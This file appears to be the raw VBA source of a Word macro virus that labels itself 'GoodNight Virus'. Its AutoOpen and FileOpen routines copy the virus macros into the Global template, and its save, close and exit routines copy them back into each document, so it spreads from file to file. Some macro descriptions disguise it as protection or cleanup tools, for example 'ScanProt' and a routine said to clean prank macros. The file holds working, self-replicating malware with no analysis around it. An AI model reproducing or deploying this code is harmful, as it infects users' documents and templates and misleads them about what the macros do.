   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileCloseAll"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of all documents"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileCloseAll.MAIN"
   Dim DocName$
   'GoodNight Virus

   On Error GoTo -1: On Error GoTo bail
   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:

   WordBasic.FileCloseAll
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim DocName$
   Rem 'GoodNight Virus

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   WordBasic.FileSaveAs dlg

   On Error GoTo -1: On Error GoTo bail
   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileSaveAs", DocName$ + ":FileSaveAs"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:

   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim DocName$
   'GoodNight Virus

   On Error GoTo -1: On Error GoTo bail
   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:

   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim DocName$
   Rem 'GoodNight Virus

   On Error GoTo -1: On Error GoTo bail
   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:

   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   Dim DocName$
   'GoodNight Virus

   On Error GoTo -1: On Error GoTo bail
   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileSaveAs", DocName$ + ":FileSaveAs"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Opens an existing document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim DocName$
   'GoodNight Virus

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg

   On Error GoTo -1: On Error GoTo skip
   DocName$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy DocName$ + ":AutoExec", "Global:AutoExec"
   WordBasic.MacroCopy DocName$ + ":AutoExit", "Global:AutoExit"
   WordBasic.MacroCopy DocName$ + ":AutoClose", "Global:AutoClose"
   WordBasic.MacroCopy DocName$ + ":FileClose", "Global:FileClose"
   WordBasic.MacroCopy DocName$ + ":FileCloseAll", "Global:FileCloseAll"
   WordBasic.MacroCopy DocName$ + ":FileSave", "Global:FileSave"
   WordBasic.MacroCopy DocName$ + ":FileSaveAs", "Global:FileSaveAs"
   WordBasic.MacroCopy DocName$ + ":FileOpen", "Global:FileOpen"
   WordBasic.MacroCopy DocName$ + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy DocName$ + ":Exit", "Global:Exit"

   skip:

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Checks Page Size; if not default Page Size, converts document to default Page Size.  FWTMPv7.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim DocName$
   Rem'GoodNight Virus

   On Error GoTo -1: On Error GoTo skip
   DocName$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy DocName$ + ":AutoExec", "Global:AutoExec"
   WordBasic.MacroCopy DocName$ + ":AutoExit", "Global:AutoExit"
   WordBasic.MacroCopy DocName$ + ":AutoClose", "Global:AutoClose"
   WordBasic.MacroCopy DocName$ + ":FileClose", "Global:FileClose"
   WordBasic.MacroCopy DocName$ + ":FileCloseAll", "Global:FileCloseAll"
   WordBasic.MacroCopy DocName$ + ":FileSave", "Global:FileSave"
   WordBasic.MacroCopy DocName$ + ":FileSaveAs", "Global:FileSaveAs"
   WordBasic.MacroCopy DocName$ + ":FileOpen", "Global:FileOpen"
   WordBasic.MacroCopy DocName$ + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy DocName$ + ":Exit", "Global:Exit"

   skip:

   End Sub

   Attribute VB_Name = "AutoExit"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
   Dim DocName$
   Rem 'GoodNight Virus

   On Error GoTo -1: On Error GoTo bail
   DocName$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
   WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
   WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
   WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
   WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
   WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
   bail:

   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "kinko's KHQ mesage:\r""AutoMacros are now turned off!"""
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   Rem DisableAutoMacros
   Rem MsgBox "Auto Macros disabled"
   End Sub
